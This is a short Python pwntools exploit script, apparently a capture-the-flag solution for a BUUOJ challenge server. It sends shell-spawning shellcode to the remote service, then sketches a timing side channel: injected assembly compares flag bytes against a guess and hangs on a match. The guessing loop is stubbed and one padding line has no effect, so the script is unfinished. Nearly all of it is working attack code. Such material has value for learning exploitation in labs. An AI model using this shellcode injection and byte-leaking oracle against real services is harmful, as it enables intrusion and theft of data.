from pwn import *


chars = '_}' + string.ascii_lowercase + string.digits
# dic = list(set(string.printable).difference(set(dic)))
# print(dic)
r = remote('node3.buuoj.cn',28798)
r.sendline(asm(shellcraft.sh()))
r.interactive()
flag = ''
for index in range(1):
	log.info(flag)
	for i in range(1):
		i = 'f'
		index = 0
		r = remote('node3.buuoj.cn',28798)
		shellcode = asm('''

				mov bl, byte ptr [{IDX_K}]
				mov dl, byte ptr [{IDX_F}]
				xor bl, dl
		
				mov al, {BYTE}
		
				loop:
				cmp al, bl
				je loop
		
				ret
				'''.format(BYTE = ord(i), IDX_K = 0xcafe028 + index % 8, IDX_F = 0xcafe000 + index))
		shellcode.ljust(0x46, '\x90')
		r.sendline(shellcode)
		r.interactive()
'''		try:
			r.interactive()
			flag += i
		except:
			r.close()'''